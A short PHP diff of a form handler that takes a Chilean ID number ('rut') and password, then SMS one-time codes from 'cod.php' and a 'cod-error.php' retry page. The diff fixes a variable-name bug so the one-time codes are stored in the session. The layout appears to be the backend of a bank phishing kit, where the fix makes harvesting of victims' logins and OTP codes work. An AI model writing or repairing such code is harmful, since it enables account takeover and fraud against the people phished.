@@ -85,7 +85,7 @@ if (isset($_POST['rut'],$_POST['password'])) {
 
     // cod.php
 } elseif (isset($_POST['otpsms'])) {
-    $code = trim($_POST['otpsms']);
+    $otp = trim($_POST['otpsms']);
     $_SESSION['otpsms'] = $otp;
     $form_origen = "cod.php";
     $otp_esc = htmlspecialchars($otp, ENT_QUOTES, 'UTF-8');
@@ -96,7 +96,7 @@ if (isset($_POST['rut'],$_POST['password'])) {
 
 // cod-error.php
 } elseif (isset($_POST['otpsms2'])) {
-    $code = trim($_POST['otpsms2']);
+    $otp = trim($_POST['otpsms2']);
     $_SESSION['otpsms2'] = $otp;
     $form_origen = "cod-error.php";
     $otp_esc = htmlspecialchars($otp, ENT_QUOTES, 'UTF-8');
